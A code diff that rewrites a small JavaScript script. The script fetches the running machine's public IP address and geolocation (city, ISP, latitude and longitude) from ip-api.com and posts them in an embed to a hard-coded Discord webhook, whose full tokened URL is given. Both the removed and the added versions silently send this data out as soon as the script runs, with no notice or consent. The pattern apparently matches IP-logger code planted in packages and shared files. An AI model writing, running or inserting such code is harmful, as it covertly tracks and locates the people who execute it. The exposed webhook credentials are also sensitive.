@@ -1,42 +1,70 @@
-const axios = require('axios');
-const { Webhook, MessageBuilder } = require('discord-webhook-node');
-const webhook = new Webhook("https://discord.com/api/webhooks/1361675207051317419/LqdYKxYX5CjAU3ij1bgfa2NfQQL95Zi_x-W3_P-CRrtExk9Du-HNafKm1KC2pN-mpX1z");
+const geoAPI = "http://ip-api.com/json/";
+const webhookURL = "https://discord.com/api/webhooks/1361652529582047442/6V_CCZ6XV_9L_vnqwF3y3rmrggqGaxDWUI6ldqFojZJ24HG8-ONFy0e6cyNGsjZQg9yN";
 
-const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true });
-axios.get('https://api.ipify.org/')
-    .then(response => {
-        const ip = response.data;
-        return axios.get(`http://extreme-ip-lookup.com/json/${ip}`);
-    })
-    .then(response => {
-        const geo = response.data;
-        const embed = new MessageBuilder()
-            .setTitle('IP Information')
-            .setColor('#00b0f4');
+async function getGeoInfo() {
+    try {
+        const response = await fetch(geoAPI);
+        const geo = await response.json();
+        return geo;
+    } catch (error) {
+        console.error("Error fetching geolocation info:", error);
+        return null;
+    }
+}
 
-        const fields = [
-            { name: 'IP', value: geo.query },
-            { name: 'ipType', value: geo.ipType },
-            { name: 'Country', value: geo.country },
-            { name: 'City', value: geo.city },
-            { name: 'Continent', value: geo.continent },
-            { name: 'IPName', value: geo.ipName },
-            { name: 'ISP', value: geo.isp },
-            { name: 'Latitude', value: geo.lat },
-            { name: 'Longitude', value: geo.lon },
-            { name: 'Org', value: geo.org },
-            { name: 'Region', value: geo.region },
-            { name: 'Status', value: geo.status },
-        ];
+async function sendToDiscord(geo) {
+    if (!geo) {
+        console.error("Geo info is null or undefined.");
+        return;
+    }
 
-        fields.forEach(field => {
-            if (field.value) {
-                embed.addField(field.name, field.value, true);
-            }
+    const fields = [
+        { name: 'IP', value: geo.query },
+        { name: 'IP Type', value: geo.mobile ? 'Mobile' : 'Fixed' },
+        { name: 'Country', value: geo.country },
+        { name: 'City', value: geo.city },
+        { name: 'Continent', value: geo.continent || 'N/A' },
+        { name: 'IP Name', value: geo.as || 'N/A' },
+        { name: 'ISP', value: geo.isp },
+        { name: 'Latitude', value: geo.lat.toString() },
+        { name: 'Longitude', value: geo.lon.toString() },
+        { name: 'Org', value: geo.org },
+        { name: 'Region', value: geo.regionName },
+        { name: 'Status', value: geo.status }
+    ];
+
+    const embed = {
+        title: "IP Geolocation Info",
+        fields: fields.map(f => ({ name: f.name, value: f.value, inline: true })),
+        timestamp: new Date().toISOString()
+    };
+
+    const payload = {
+        embeds: [embed]
+    };
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
         });
 
-        webhook.send(embed);
-    })
-    .catch(error => {
-        console.error(error);
-    });
+        if (response.ok) {
+            console.log("Geo info sent to Discord successfully!");
+        } else {
+            console.error("Error sending geo info to Discord:", response.statusText);
+        }
+    } catch (error) {
+        console.error("Error:", error);
+    }
+}
+
+async function main() {
+    const geo = await getGeoInfo();
+    await sendToDiscord(geo);
+}
+
+main();
